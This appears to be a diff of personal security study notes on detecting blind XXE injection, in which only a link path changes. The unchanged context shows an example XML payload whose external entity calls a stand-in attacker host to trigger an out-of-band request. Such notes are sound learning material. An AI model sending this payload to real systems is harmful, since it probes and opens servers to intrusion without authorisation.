@@ -1,4 +1,4 @@
-Detecting blind XXE can be done by using the same technique as [XXE to SSRF attacks](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FXXE%20Injection%2FCommon%20XXE%20Attacks%2FChained%20XXE%20to%20SSRF), but triggering the out-of-band network interaction to a system that an attacker control. For example, an attacker can define an external entity as follows:
+Detecting blind XXE can be done by using the same technique as [XXE to SSRF attacks](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FVulnerabilities%20%26%20Attacks%2FXXE%20Injection%2FCommon%20XXE%20Attacks%2FChained%20XXE%20to%20SSRF), but triggering the out-of-band network interaction to a system that an attacker control. For example, an attacker can define an external entity as follows:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
